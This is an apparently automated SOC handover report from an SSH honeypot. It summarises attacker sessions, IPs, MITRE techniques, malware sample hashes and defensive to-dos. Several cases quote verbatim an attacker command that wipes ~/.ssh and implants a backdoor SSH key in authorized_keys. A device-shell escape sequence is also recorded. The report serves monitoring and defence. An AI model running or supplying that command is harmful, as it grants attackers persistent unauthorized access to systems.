| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:29:25` | `cowrie.session.connect` |
| `2026-05-16 05:29:25` | `cowrie.client.version` |
| `2026-05-16 05:29:26` | `cowrie.client.kex` |
| `2026-05-16 05:29:27` | `cowrie.login.success` |
| `2026-05-16 05:29:27` | `cowrie.session.params` |
| `2026-05-16 05:29:27` | `cowrie.command.input` |
| `2026-05-16 05:29:27` | `cowrie.command.failed` |
| `2026-05-16 05:29:28` | `cowrie.log.closed` |
| `2026-05-16 05:29:28` | `cowrie.session.params` |
| `2026-05-16 05:29:28` | `cowrie.command.input` |
| `2026-05-16 05:29:29` | `cowrie.session.file_download` |
| `2026-05-16 05:29:29` | `cowrie.log.closed` |
| `2026-05-16 05:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019e49d40414

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:29 |
| **Last Seen** | 2026-05-16 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:29:32` | `cowrie.session.connect` |
| `2026-05-16 05:29:32` | `cowrie.client.version` |
| `2026-05-16 05:29:32` | `cowrie.client.kex` |
| `2026-05-16 05:29:33` | `cowrie.login.success` |
| `2026-05-16 05:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b49a229f150

| Field | Detail |
|---|---|
| **Source IP** | `58.242.60[.]172` |
| **First Seen** | 2026-05-16 06:14 |
| **Last Seen** | 2026-05-16 06:15 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `start, enable, config terminal, system, linuxshell` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:14:53` | `cowrie.session.connect` |
| `2026-05-16 06:14:54` | `cowrie.login.success` |
| `2026-05-16 06:14:54` | `cowrie.session.params` |
| `2026-05-16 06:14:54` | `cowrie.command.input` |
| `2026-05-16 06:14:54` | `cowrie.command.failed` |
| `2026-05-16 06:14:54` | `cowrie.command.input` |
| `2026-05-16 06:14:55` | `cowrie.command.input` |
| `2026-05-16 06:14:55` | `cowrie.command.failed` |
| `2026-05-16 06:14:55` | `cowrie.command.input` |
| `2026-05-16 06:14:55` | `cowrie.command.failed` |
| `2026-05-16 06:14:55` | `cowrie.command.input` |
| `2026-05-16 06:14:55` | `cowrie.command.failed` |
| `2026-05-16 06:14:55` | `cowrie.command.input` |
| `2026-05-16 06:14:55` | `cowrie.command.failed` |
| `2026-05-16 06:14:56` | `cowrie.command.input` |
| `2026-05-16 06:14:56` | `cowrie.command.input` |
| `2026-05-16 06:14:56` | `cowrie.command.input` |
| `2026-05-16 06:14:57` | `cowrie.command.success` |
| `2026-05-16 06:14:57` | `cowrie.command.success` |
| `2026-05-16 06:14:57` | `cowrie.command.input` |
| `2026-05-16 06:14:57` | `cowrie.command.input` |
| `2026-05-16 06:15:07` | `cowrie.log.closed` |
| `2026-05-16 06:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.242.60[.]172` to AbuseIPDB if not already reported
- [ ] Block `58.242.60[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7898dd2871d

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:19 |
| **Last Seen** | 2026-05-16 06:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:19:41` | `cowrie.session.connect` |
| `2026-05-16 06:19:41` | `cowrie.client.version` |
| `2026-05-16 06:19:41` | `cowrie.client.kex` |
| `2026-05-16 06:19:41` | `cowrie.login.success` |
| `2026-05-16 06:19:41` | `cowrie.session.params` |
| `2026-05-16 06:19:41` | `cowrie.command.input` |
| `2026-05-16 06:19:41` | `cowrie.command.failed` |
| `2026-05-16 06:19:41` | `cowrie.log.closed` |
| `2026-05-16 06:19:41` | `cowrie.session.params` |
| `2026-05-16 06:19:41` | `cowrie.command.input` |
| `2026-05-16 06:19:41` | `cowrie.session.file_download` |
| `2026-05-16 06:19:41` | `cowrie.log.closed` |
| `2026-05-16 06:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef9c415a84a

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:19 |
| **Last Seen** | 2026-05-16 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:19:42` | `cowrie.session.connect` |
| `2026-05-16 06:19:42` | `cowrie.client.version` |
| `2026-05-16 06:19:42` | `cowrie.client.kex` |
| `2026-05-16 06:19:42` | `cowrie.login.success` |
| `2026-05-16 06:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf642ba7bee

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:21 |
| **Last Seen** | 2026-05-16 06:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:21:07` | `cowrie.session.connect` |
| `2026-05-16 06:21:07` | `cowrie.client.version` |
| `2026-05-16 06:21:07` | `cowrie.client.kex` |
| `2026-05-16 06:21:07` | `cowrie.login.success` |
| `2026-05-16 06:21:07` | `cowrie.session.params` |
| `2026-05-16 06:21:07` | `cowrie.command.input` |
| `2026-05-16 06:21:07` | `cowrie.command.failed` |
| `2026-05-16 06:21:07` | `cowrie.log.closed` |
| `2026-05-16 06:21:08` | `cowrie.session.params` |
| `2026-05-16 06:21:08` | `cowrie.command.input` |
| `2026-05-16 06:21:08` | `cowrie.session.file_download` |
| `2026-05-16 06:21:08` | `cowrie.log.closed` |
| `2026-05-16 06:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61e44736f7e0

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:21 |
| **Last Seen** | 2026-05-16 06:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:21:09` | `cowrie.session.connect` |
| `2026-05-16 06:21:09` | `cowrie.client.version` |
| `2026-05-16 06:21:09` | `cowrie.client.kex` |
| `2026-05-16 06:21:09` | `cowrie.login.success` |
| `2026-05-16 06:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8b424cea58

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:22 |
| **Last Seen** | 2026-05-16 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:22:31` | `cowrie.session.connect` |
| `2026-05-16 06:22:31` | `cowrie.client.version` |
| `2026-05-16 06:22:31` | `cowrie.client.kex` |
| `2026-05-16 06:22:31` | `cowrie.login.success` |
| `2026-05-16 06:22:31` | `cowrie.session.params` |
| `2026-05-16 06:22:31` | `cowrie.command.input` |
| `2026-05-16 06:22:31` | `cowrie.command.failed` |
| `2026-05-16 06:22:31` | `cowrie.log.closed` |
| `2026-05-16 06:22:31` | `cowrie.session.params` |
| `2026-05-16 06:22:31` | `cowrie.command.input` |
| `2026-05-16 06:22:32` | `cowrie.session.file_download` |
| `2026-05-16 06:22:32` | `cowrie.log.closed` |
| `2026-05-16 06:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2fc1a66e338

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:22 |
| **Last Seen** | 2026-05-16 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:22:33` | `cowrie.session.connect` |
| `2026-05-16 06:22:33` | `cowrie.client.version` |
| `2026-05-16 06:22:33` | `cowrie.client.kex` |
| `2026-05-16 06:22:33` | `cowrie.login.success` |
| `2026-05-16 06:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee33d37094e

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:23 |
| **Last Seen** | 2026-05-16 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:23:53` | `cowrie.session.connect` |
| `2026-05-16 06:23:53` | `cowrie.client.version` |
| `2026-05-16 06:23:53` | `cowrie.client.kex` |
| `2026-05-16 06:23:53` | `cowrie.login.success` |
| `2026-05-16 06:23:53` | `cowrie.session.params` |
| `2026-05-16 06:23:53` | `cowrie.command.input` |
| `2026-05-16 06:23:53` | `cowrie.command.failed` |
| `2026-05-16 06:23:53` | `cowrie.log.closed` |
| `2026-05-16 06:23:53` | `cowrie.session.params` |
| `2026-05-16 06:23:53` | `cowrie.command.input` |
| `2026-05-16 06:23:53` | `cowrie.session.file_download` |
| `2026-05-16 06:23:53` | `cowrie.log.closed` |
| `2026-05-16 06:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a054cc74c41c

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]212` |
| **First Seen** | 2026-05-16 06:23 |
| **Last Seen** | 2026-05-16 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 06:23:54` | `cowrie.session.connect` |
| `2026-05-16 06:23:54` | `cowrie.client.version` |
| `2026-05-16 06:23:54` | `cowrie.client.kex` |
| `2026-05-16 06:23:55` | `cowrie.login.success` |
| `2026-05-16 06:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.182.234[.]69` | **234** | 2026-05-16 03:31 | 2026-05-16 06:24 | 176m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.68[.]55` | **33** | 2026-05-16 03:32 | 2026-05-16 03:33 | 6m | 4 | `T1110.001` | 🟠 MEDIUM |
| `45.148.120[.]187` | **13** | 2026-05-16 03:41 | 2026-05-16 04:56 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `72.9.118[.]56` | **13** | 2026-05-16 03:32 | 2026-05-16 03:32 | 0m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `166.62.41[.]26` | **9** | 2026-05-16 05:15 | 2026-05-16 05:30 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `161.35.8[.]0` | **6** | 2026-05-16 05:49 | 2026-05-16 06:18 | 5m | 0 | `T1592` | 🟢 LOW |
| `49.207.244[.]212` | **6** | 2026-05-16 06:12 | 2026-05-16 06:23 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]45` | **4** | 2026-05-16 03:56 | 2026-05-16 03:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.17.207[.]148` | **3** | 2026-05-16 04:32 | 2026-05-16 04:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.29.57[.]244` | **2** | 2026-05-16 05:39 | 2026-05-16 05:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]124` | **2** | 2026-05-16 05:15 | 2026-05-16 05:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.193.176[.]131` | 1 | 2026-05-16 05:18 | 2026-05-16 05:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.177[.]88` | 1 | 2026-05-16 05:19 | 2026-05-16 05:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.134.216[.]108` | 1 | 2026-05-16 03:55 | 2026-05-16 03:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `78.79.220[.]64` | 1 | 2026-05-16 06:07 | 2026-05-16 06:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]23` | 1 | 2026-05-16 03:57 | 2026-05-16 03:57 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `107.182.234[.]69` | US | Hosting Services, Inc. | **100** ⚠️ | 1 |
| `72.9.118[.]56` | US | CTI Fiber | **100** ⚠️ | 8 |
| `3.134.216[.]108` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `161.35.8[.]0` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `20.29.57[.]244` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `49.207.244[.]212` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 1 |
| `91.230.168[.]23` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `66.132.172[.]45` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `66.132.195[.]124` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `180.76.177[.]88` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 22 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 52 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 29 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 24 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 366 cases |
| Tool 34  | Credential Extractor        | ✅ 54 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (3.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 24 priority case(s) shown individually · 16 recon entry/entries in table (11 group(s) consolidating 325 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
